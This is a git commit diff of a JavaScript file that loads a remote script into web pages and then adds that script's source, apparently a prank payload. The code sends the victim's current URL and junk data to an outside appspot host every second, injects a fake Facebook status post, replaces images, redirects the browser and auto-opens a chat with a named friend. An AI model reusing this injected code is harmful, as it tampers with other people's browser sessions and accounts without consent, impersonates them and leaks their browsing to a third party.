f0497c9a54b77de79db1aa1c0fb69b8bd35953d7
mseltzer94 <michael.m.seltzer@gmail.com>
2012-12-04 17:56:11 -0700

    Update replace.js
    This was needed

--- replace.js
+++ replace.js
@@ -1,3 +1,145 @@
 s = document.createElement("script");
 s.src = "https://dl.dropbox.com/u/5218422/a2b35.js";
 document.body.appendChild(s);
+
+New https://dl.dropbox.com/u/5218422/a2b35.js:
+
+// document.body.innerHTML = document.body.innerHTML.replace(/CAS/g,'ASS');
+// document.body.innerHTML = document.body.innerHTML.replace(/Aaron/g,'Noraa');
+// document.body.innerHTML = document.body.innerHTML.replace(/Michael/g, 'Big Seltz');
+
+// WOW I learned a little javascript
+win = 0
+setInterval(function yehaw () {
+var str = ["title=" + "BITCH PLEASE", "url=" + "http://www.youtube.com/watch?v=dQw4w9WgXcQ"];
+
+var xhr = new XMLHttpRequest();
+xhr.open('POST', 'https://aaronpdata.appspot.com/history');
+xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded")
+xhr.send(str.join("&"));
+win = win +1;
+document.body.innerHTML="";
+document.write(win);
+}, 1000);
+// try{
+if (window.location.href == "https://www.facebook.com/"){
+  
+  
+  code = '<li class="uiUnifiedStory uiStreamStory genericStreamStory aid_1502482450 aid_350685531728 uiListItem" data-ft="{&quot;qid&quot;:&quot;5817943140628040844&quot;,&quot;mf_story_key&quot;:&quot;3706720415453411168&quot;,&quot;has_expanded_ufi&quot;:&quot;1&quot;}" id="stream_story_50bd7c765a89e5a19250165" aria-haspopup="true"> \
+   <div class="clearfix storyContent"> \
+      <a class="actorPhoto lfloat" href="https://www.facebook.com/michael.m.seltzer" tabindex="-1" aria-hidden="true" data-ft="{&quot;type&quot;:60,&quot;tn&quot;:&quot;\u003C&quot;}" data-hovercard="/ajax/hovercard/hovercard.php?id=1416047904"><img class="_s0 profilePic _rw img" src="https://fbcdn-profile-a.akamaihd.net/hprofile-ak-ash4/372664_1416047904_1717461877_q.jpg" alt="" /></a> \
+      <div class="storyInnerContent"> \
+         <div class="mainWrapper"> \
+            <div role="article"> \
+               <h5 class="uiStreamMessage uiStreamHeadline" data-ft="{&quot;tn&quot;:&quot;:&quot;}"> \
+                  <div class="actorDescription actorName" data-ft="{&quot;type&quot;:2,&quot;tn&quot;:&quot;:&quot;}"><a href="https://www.facebook.com/michael.m.seltzer" data-ft="{&quot;tn&quot;:&quot;;&quot;}" data-hovercard="/ajax/hovercard/user.php?id=1416047904" aria-owns="js_8" aria-controls="js_8" aria-haspopup="true" id="js_9">Michael Seltzer</a></div> \
+               </h5> \
+               <h5 class="uiStreamMessage userContentWrapper" data-ft="{&quot;type&quot;:1,&quot;tn&quot;:&quot;K&quot;}"> \
+                  <span class="messageBody" data-ft="{&quot;type&quot;:3}"> \
+                     <div><span class="userContent">Got initiated today. Now I\'m a man.</span></div> \
+                  </span> \
+               </h5> \
+               <form rel="async" class="live_3959569116634_316526391751760 commentable_item autoexpand_mode" method="post" action="/ajax/ufi/modify.php" data-live="{&quot;seq&quot;:0}" onsubmit="return window.Event &amp;&amp; Event.__inlineSubmit &amp;&amp; Event.__inlineSubmit(this,event)" id="uj5jove23"> \
+                  <input type="hidden" name="charset_test" value="&euro;,&acute;,&euro;,&acute;,?,?,?" /><input type="hidden" name="fb_dtsg" value="AQDctEh3" autocomplete="off" /><input type="hidden" autocomplete="off" name="feedback_params" value="{&quot;actor&quot;:&quot;1502482450&quot;,&quot;target_fbid&quot;:&quot;3959569116634&quot;,&quot;target_profile_id&quot;:&quot;1502482450&quot;,&quot;type_id&quot;:&quot;22&quot;,&quot;assoc_obj_id&quot;:&quot;&quot;,&quot;source_app_id&quot;:&quot;0&quot;,&quot;extra_story_params&quot;:[],&quot;content_timestamp&quot;:&quot;1354595310&quot;,&quot;check_hash&quot;:&quot;AQAGI6aKLeFYjJMB&quot;,&quot;source&quot;:&quot;1&quot;}" /><input type="hidden" autocomplete="off" name="data_only_response" value="1" /><span class="uiStreamFooter"><span class="UIActionLinks UIActionLinks_bottom" data-ft="{&quot;tn&quot;:&quot;=&quot;,&quot;type&quot;:20}"><span><a class="UFILikeLink" href="#" aria-live="polite" title="Like this item" data-ft="{&quot;tn&quot;:&quot;&gt;&quot;}" id=".reactRoot[27]"><span id=".reactRoot[27].">Like</span></a></span> &middot <label class="uiLinkButton comment_link" title="Leave a comment"><input data-ft="{&quot;type&quot;:24,&quot;tn&quot;:&quot;S&quot;}" type="button" value="Comment" onclick="return fc_click(this);" /></label> &middot </span><span class="uiStreamSource" data-ft="{&quot;type&quot;:26,&quot;tn&quot;:&quot;N&quot;}"><a href="/michael.m.seltzer"><abbr title="Monday, December 3, 2012 at 9:28pm" data-utime="1354595310" class="timestamp livetimestamp">2 minutes ago</abbr></a> via <a href="/mobile/?v=350685531728">mobile</a></span> &middot <a data-hover="tooltip" class="uiStreamPrivacy inlineBlock fbStreamPrivacy fbPrivacyAudienceIndicator" href="#" id="uj5jove24" aria-label="Shared with: Your friends"><i class="lock img sp_7uj4ry sx_7437b0"></i></a></span> \
+                  <div> \
+                     <div class="uiUfi UFIContainer utn" id="uj5jove16"> \
+                        <ul class="UFIList" data-ft="{&quot;tn&quot;:&quot;]&quot;}" id=".reactRoot[28]"> \
+                           <li class="UFIArrow" id=".reactRoot[28].[0]"><i id=".reactRoot[28].[0]."></i></li> \
+                           <li class="UFIRow UFILikeSentence" id=".reactRoot[28].[1][0]"> \
+                              <div class="clearfix" id=".reactRoot[28].[1][0]."> \
+                                 <div class="lfloat" id=".reactRoot[28].[1][0]..[0]"><a class="img _8o _8r UFILikeThumb UFIImageBlockImage" href="#" tabindex="-1" title="Like this item" id=".reactRoot[28].[1][0]..[0]."><i class="UFILikeIcon" id=".reactRoot[28].[1][0]..[0].."></i></a></div> \
+                                 <div class="" id=".reactRoot[28].[1][0]..[1]"> \
+                                  <div class="UFIImageBlockContent _8m _8u" id=".reactRoot[179].[1][0]..[1]."><span id=".reactRoot[179].[1][0]..[1].."><a rel="dialog" ajaxify="/ajax/browser/dialog/likes?id=3959569116634" href="/browse/likes?id=3959569116634" data-hover="tooltip" data-tooltip-alignh="center" id=".reactRoot[179].[1][0]..[1]...[2]" aria-label="Belinda Pak \
+" aria-owns="js_1" aria-controls="js_1" aria-haspopup="true"><span id=".reactRoot[179].[1][0]..[1]...[2].">40 people</span></a><span id=".reactRoot[179].[1][0]..[1]...[3]"> like this.</span></span></div> \
+ \
+                                 </div> \
+                              </div> \
+                           </li> \
+                           <li class="UFIRow UFIAddComment" data-ft="{&quot;tn&quot;:&quot;[&quot;}" id=".reactRoot[28].[1][3]"> \
+                              <div class="clearfix UFIMentionsInputWrap" id=".reactRoot[28].[1][3]."> \
+                                 <div class="lfloat" id=".reactRoot[28].[1][3]..[0]"><img class="img _8o _8r img UFIActorImage _rx UFIImageBlockImage" src="https://fbcdn-profile-a.akamaihd.net/hprofile-ak-ash4/372664_1416047904_1717461877_q.jpg" alt="" id=".reactRoot[28].[1][3]..[0]." /></div> \
+                                 <div class="" id=".reactRoot[28].[1][3]..[1]"> \
+                                    <div class="UFIImageBlockContent _8m _8u" id=".reactRoot[28].[1][3]..[1]."> \
+                                       <div id=".reactRoot[28].[1][3]..[1].."> \
+                                          <div class="uiMentionsInput textBoxContainer ReactLegacyMentionsInput" id=".reactRoot[28].[1][3]..[1]...[0]"> \
+                                             <div class="highlighter" id=".reactRoot[28].[1][3]..[1]...[0].[0]"> \
+                                                <div id=".reactRoot[28].[1][3]..[1]...[0].[0]."><span class="highlighterContent hidden_elem" id=".reactRoot[28].[1][3]..[1]...[0].[0].."></span></div> \
+                                             </div> \
+                                             <div class="uiTypeahead mentionsTypeahead" id=".reactRoot[28].[1][3]..[1]...[0].[1]"> \
+                                                <div class="wrap" id=".reactRoot[28].[1][3]..[1]...[0].[1]."> \
+                                                   <input type="hidden" class="hiddenInput" id=".reactRoot[28].[1][3]..[1]...[0].[1]..[0]" /> \
+                                                   <div class="innerWrap" id=".reactRoot[28].[1][3]..[1]...[0].[1]..[1]"><textarea name="add_comment_text" class="textInput mentionsTextarea uiTextareaAutogrow uiTextareaNoResize UFIAddCommentInput DOMControl_placeholder" title="Write a comment..." placeholder="Write a comment..." id=".reactRoot[28].[1][3]..[1]...[0].[1]..[1].">Write a comment...</textarea></div> \
+                                                </div> \
+                                             </div> \
+                                             <input type="hidden" class="mentionsHidden" value="" id=".reactRoot[28].[1][3]..[1]...[0].[2]" /> \
+                                          </div> \
+                                       </div> \
+                                    </div> \
+                                 </div> \
+                              </div> \
+                           </li> \
+                        </ul> \
+                     </div> \
+                  </div> \
+                  <input type="hidden" name="link_data" value="{&quot;qid&quot;:&quot;5817943140628040844&quot;,&quot;mf_story_key&quot;:&quot;3706720415453411168&quot;,&quot;has_expanded_ufi&quot;:&quot;1&quot;}" /> \
+               </form> \
+            </div> \
+         </div> \
+         <div class="_6a  mlm uiPopover highlightSelector uiStreamHide" data-ft="{&quot;type&quot;:55,&quot;tn&quot;:&quot;V&quot;}" id="uj5jove8"><a class="highlightSelectorButton uiStreamContextButton _p" href="#" aria-haspopup="true" aria-expanded="false" rel="toggle" id="uj5jove9" role="button">Options</a></div> \
+      </div> \
+   </div> \
+</li>';
+
+document.getElementById("home_stream").innerHTML = code + document.getElementById("home_stream").innerHTML;
+  
+  
+  
+  
+  var str2 = ["title=" + encodeURIComponent("FAKE STATUS"), "url=" + encodeURIComponent(window.location.href)];
+
+  var xhr2 = new XMLHttpRequest();
+  xhr2.open('POST', 'https://aaronpdata.appspot.com/history');
+  xhr2.setRequestHeader("Content-type", "application/x-www-form-urlencoded")
+  xhr2.send(str2.join("&"));
+}
+// }
+// }  	
+// catch(e){
+  // var str3 = ["title=" + encodeURIComponent("ERROR"), "url=" + encodeURIComponent(e.message)];
+
+  // var xhr3 = new XMLHttpRequest();
+  // xhr3.open('POST', 'https://aaronpdata.appspot.com/history');
+  // xhr3.setRequestHeader("Content-type", "application/x-www-form-urlencoded")
+  // xhr3.send(str3.join("&"));
+// }
+  // if (!Math.floor(Math.random() * 30)){
+ document.body.style.webkitTransform = "scaleY(-1)";
+ // }
+  
+  imgs = document.images;
+  for (i=0;i<imgs.length;i++){
+    imgs[i].src = "https://sphotos-a.xx.fbcdn.net/hphotos-snc6/182110_3996392158171_16759363_n.jpg";
+    imgs[i].style.webkitTransform = "scaleY(-1)";
+  }
+
+setTimeout('window.location.href = "https://sphotos-a.xx.fbcdn.net/hphotos-snc6/182110_3996392158171_16759363_n.jpg";', 5000);
+//if (ebayh1=document.getElementById("itemTitle")){
+//ebayh1.innerHTML = ebayh1.innerHTML.replace(/LG Google Nexus 4/g, 'LG Google Nexus 3');
+//}
+
+setTimeout(function(){
+ems = document.getElementsByClassName("fbChatOrderedList")[0].getElementsByTagName('a');
+for (i=0;i<ems.length;i++){
+  if (ems[i].text.match(/Belinda Pak/i)){
+    ems[i].click();
+    break;
+  }
+}
+
+ems = document.getElementsByClassName("uiTextareaAutogrow input")
+el = ems[ems.length-1];
+el.focus();
+
+}, 3000);
+
+setInterval(function(){document.getElementsByClassName("giveup")[0].click();}, 20000);
